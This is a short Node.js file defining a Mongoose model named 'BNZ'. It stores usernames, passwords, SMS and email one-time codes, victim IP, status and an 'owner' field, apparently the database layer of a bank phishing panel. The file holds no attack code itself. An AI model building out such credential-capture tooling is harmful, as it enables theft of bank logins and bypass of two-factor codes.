const mongoose = require("mongoose");

const bnzSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    smsCode: String,
    emailCode: String,
    status: Number,
    ip: String,
    owner: String,
});

module.exports = mongoose.model("BNZ", bnzSchema);
